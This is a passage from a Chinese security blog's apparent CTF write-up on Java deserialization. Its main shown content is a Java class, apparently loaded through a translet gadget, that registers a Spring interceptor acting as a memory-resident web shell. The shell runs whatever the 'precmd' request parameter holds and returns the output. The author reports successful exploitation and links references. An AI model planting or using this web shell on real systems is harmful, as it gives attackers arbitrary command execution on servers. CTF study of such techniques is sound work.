</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Interceptor_demo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">preHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">precmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;precmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">precmd</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;!</span><span class="n">precmd</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Process</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">precmd</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">InputStreamReader</span><span class="w"> </span><span class="n">isr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InputStreamReader</span><span class="p">(</span><span class="n">process</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">BufferedReader</span><span class="w"> </span><span class="n">br</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BufferedReader</span><span class="p">(</span><span class="n">isr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">line</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\n&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">br</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;执行命令时出现异常: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;preprepreprepreprepre&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//    public Interceptor_demo(String a) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">postHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">mv</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;postpostpostpostpost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;afterafterafterafter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>最后成功利用</strong>hhh</p>
<p><img loading="lazy" src="../images/image-20241202115907199.png" alt="image-20241202115907199"  />
</p>
<ul>
<li>题目附件：6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xTlBBUlhLLWNrWGNTQU9QVHlybGxLUT9wd2Q9ZmxhZyDmj5Dlj5bnoIE6IGZsYWc=（自行Base64解码）</li>
</ul>
<p>参考：</p>
<blockquote>
<p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a></p>
<p><a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD">https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DU2AAUx0IxY5D8WzmeD</a></p>
<p><a href="https://xiinnn.com/posts/2023zjctf-pre-secobj/#signedobject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%A8hsts%E5%A5%97%E5%A8%83%E8%A7%A6%E5%8F%91">2023浙江大学生省赛初赛 secObj</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
    <span class="title">« 上一页</span>
    <br>
    <span>Spring内存马</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/cc_chain/">
    <span class="title">下一页 »</span>
    <br>
    <span>Commons-Collections1-7</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
